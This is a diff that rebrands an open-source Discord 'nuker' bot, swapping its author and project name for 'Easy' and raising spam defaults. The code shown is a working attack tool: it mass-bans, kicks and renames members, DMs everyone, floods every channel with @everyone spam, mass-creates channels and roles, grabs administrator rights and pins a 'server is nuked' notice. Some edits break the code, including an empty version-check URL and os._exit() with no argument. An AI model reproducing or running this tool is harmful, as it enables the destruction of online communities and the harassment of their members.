@@ -1,3 +1,4 @@
+
 import json
 import os
 import traceback
@@ -20,7 +21,6 @@ except FileNotFoundError:
             version = data.readline()
     except FileNotFoundError:
         version = ""
-
 embedColor = 0x5c92ff
 colors = {"main": Fore.CYAN,
           "white": Fore.WHITE,
@@ -49,7 +49,7 @@ def checkVersion():
     if version == "":
         return ""
     req = requests.get(
-        "https://raw.githubusercontent.com/ICEGXG/UntitledNuker/master/version.txt")
+        "https://")
     if req.status_code == requests.codes.ok:
         gitVersion = req.text.rstrip()
         if version == gitVersion:
@@ -85,9 +85,9 @@ print(f'{colors["main"]}\n\n                  __  __  __   __  ______ __  ______
       "\n"
       "\n"
       "\n"
-      f"{colors['white']}                           Author: {colors['main']}ICE#4449\n"
+      f"{colors['white']}                           Author: {colors['main']}Bimmortal\n"
       f"{colors['white']}                           Version: {colors['main']}{version} {checkVersion()}\n"
-      f"{colors['white']}                           GitHub: {colors['main']}https://github.com/ICEGXG/UntitledNuker\n\n{colors['white']}")
+      f"{colors['white']}                           GitHub: {colors['main']}https://github.com\n\n{colors['white']}")
 
 """
 Fetching prefix, token and owner ID's from config
@@ -118,7 +118,7 @@ except FileNotFoundError:
     else:
         owners = [int(owners)]
     activity = {"type": "playing",
-                "text": f"Untitled Nuker v{version}",
+                "text": f"Easy v{version}",
                 "isenabled": True}
     enablelogging = False
     config = {
@@ -191,8 +191,8 @@ async def help(ctx):
     await msg_delete(ctx)
     p = bot.command_prefix
     embed = discord.Embed(title="Help", color=embedColor)
-    embed.set_author(name="Untitled Nuker",
-                     url="https://github.com/ICEGXG/UntitledNuker")
+    embed.set_author(name="Easy",
+                     url="https://github.com")
     embed.add_field(
         name="Nuke", value=f">>> `{p}1 <ban 1/0> <your text>`", inline=False)
     embed.add_field(name="Ban everyone", value=f">>> `{p}2`", inline=False)
@@ -225,7 +225,7 @@ async def help(ctx):
         name="Revive (DM Only)", value=f">>> Creating 1 text channel on server if you deleted all\n`{p}15 <guild id>`", inline=False)
     embed.add_field(name="Settings", value=f">>> `{p}settings`")
     embed.add_field(name="\u200b\nInfo",
-                    value=f">>> **Untitled Nuker**\nMade by <@404323086561837066>\nVersion: {version} {checkVersion()}\nGitHub: https://github.com/ICEGXG/UntitledNuker\n", inline=False)
+                    value=f">>> **Easy**\nMade by <@404323086561837066>\nVersion: {version} {checkVersion()}\nGitHub: https://github.com\n", inline=False)
     await ctx.message.author.send(embed=embed)
 
 
@@ -235,8 +235,8 @@ async def settings(ctx):
     p = bot.command_prefix
     embed = discord.Embed(
         title="Settings", description="Available settings\n`Only for owners`", color=embedColor)
-    embed.set_author(name="Untitled Nuker",
-                     url="https://github.com/ICEGXG/UntitledNuker")
+    embed.set_author(name="Easy",
+                     url="https://github.com")
     embed.add_field(
         name="Prefix", value=f">>> Change prefix\n`{p}settings prefix <prefix>`", inline=False)
     embed.add_field(
@@ -317,7 +317,7 @@ async def settingsWhitelist(ctx, action):
 
 @settings.command(name='activity')
 @commands.check(isOwner)
-async def settingsActivity(ctx, action, activityType="playing", *, text=f"Untitled Nuker v{version}"):
+async def settingsActivity(ctx, action, activityType="playing", *, text=f"Easy v{version}"):
     global config
     global activity
     if action == "set":
@@ -352,7 +352,7 @@ async def settingsActivity(ctx, action, activityType="playing", *, text=f"Untitl
 
 @bot.command(name='1', aliases=["nk", "nuke"])
 @commands.check(isWhitelisted)
-async def nuke(ctx, ban: bool = True, text: str = "Untitled Nuker"):
+async def nuke(ctx, ban: bool = True, text: str = "Easy"):
     await msg_delete(ctx)
 
     """
@@ -402,8 +402,8 @@ async def nuke(ctx, ban: bool = True, text: str = "Untitled Nuker"):
     try:
         embed = discord.Embed(color=embedColor)
         embed.add_field(name="This server is Nuked",
-                        value="By Unitled Nuker\nDownload: https://github.com/ICEGXG/UntitledNuker", inline=False)
-        channel = await ctx.guild.create_text_channel(name="Untitled Nuker")
+                        value="By Easy\nDownload: son", inline=False)
+        channel = await ctx.guild.create_text_channel(name="Easy")
         message = await channel.send(embed=embed)
         await message.pin()
     except:
@@ -442,7 +442,7 @@ async def kickEveryone(ctx):
 
 @bot.command(name="4", aliases=["chen"])
 @commands.check(isWhitelisted)
-async def renameEveryone(ctx, *, name="Untitled Nuker"):
+async def renameEveryone(ctx, *, name="Easy"):
     await msg_delete(ctx)
     for m in ctx.guild.members:
         if m.id not in owners:
@@ -457,7 +457,7 @@ async def renameEveryone(ctx, *, name="Untitled Nuker"):
 
 @bot.command(name="5", aliases=["dme"])
 @commands.check(isWhitelisted)
-async def dmEveryone(ctx, *, msg="Untitled Nuker"):
+async def dmEveryone(ctx, *, msg="Easy"):
     await msg_delete(ctx)
     for m in ctx.guild.members:
         if m.id not in owners:
@@ -472,7 +472,7 @@ async def dmEveryone(ctx, *, msg="Untitled Nuker"):
 
 @bot.command(name="6", aliases=["sa"])
 @commands.check(isWhitelisted)
-async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
+async def spamToAllChannels(ctx, amount: int = 521, *, text="@everyone Easy"):
     await msg_delete(ctx)
     for i in range(amount):
         for ch in ctx.guild.channels:
@@ -485,7 +485,7 @@ async def spamToAllChannels(ctx, amount: int = 50, *, text="@everyone Untitled N
 
 @bot.command(name='7', aliases=["sc"])
 @commands.check(isWhitelisted)
-async def spamToCurrentChannel(ctx, amount: int = 50, *, text="@everyone Untitled Nuker"):
+async def spamToCurrentChannel(ctx, amount: int = 100, *, text="@everyone Easy"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -521,7 +521,7 @@ async def deleteAllRoles(ctx):
 
 @bot.command(name="10", aliases=["sch"])
 @commands.check(isWhitelisted)
-async def spamWithChannels(ctx, amount: int = 25, *, name="Untitled Nuker"):
+async def spamWithChannels(ctx, amount: int = 25, *, name="Easy"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -533,7 +533,7 @@ async def spamWithChannels(ctx, amount: int = 25, *, name="Untitled Nuker"):
 
 @bot.command(name="11", aliases=["sr"])
 @commands.check(isWhitelisted)
-async def spamWithRoles(ctx, amount: int = 25, *, name="Untitled Nuker"):
+async def spamWithRoles(ctx, amount: int = 25, *, name="Easy"):
     await msg_delete(ctx)
     for i in range(amount):
         try:
@@ -561,7 +561,7 @@ async def editServerIcon(ctx):
 
 @bot.command(name='13', aliases=["sn"])
 @commands.check(isWhitelisted)
-async def editServerName(ctx, *, name="Untitled Nuker"):
+async def editServerName(ctx, *, name="Easy"):
     await msg_delete(ctx)
     try:
         await ctx.guild.edit(name=name)
@@ -572,7 +572,7 @@ async def editServerName(ctx, *, name="Untitled Nuker"):
 
 @bot.command(name="14", aliases=["ga"])
 @commands.check(isWhitelisted)
-async def getAdmin(ctx, *, rolename="Untitled Nuker"):
+async def getAdmin(ctx, *, rolename="Easy"):
     await msg_delete(ctx)
     try:
         perms = discord.Permissions(administrator=True)
@@ -590,7 +590,7 @@ async def reviveGuild(ctx, guildId: int = None):
     if guildId:
         guild = bot.get_guild(guildId)
         try:
-            await guild.create_text_channel(name="Untitled Nuker")
+            await guild.create_text_channel(name="Easy")
             print(f"{msgs['+']} Revived {guild}")
         except:
             print(f"{msgs['error']} Can't revive {guild}")
@@ -622,4 +622,4 @@ except Exception as e:
     print(f'{colors["red"]}\nAn error occured while logging:\n{"".join(traceback.format_exception(type(e), e, e.__traceback__))}{colors["white"]}\n')
     print(msgs['pressenter'])
     input()
-    os._exit(0)
+    os._exit()
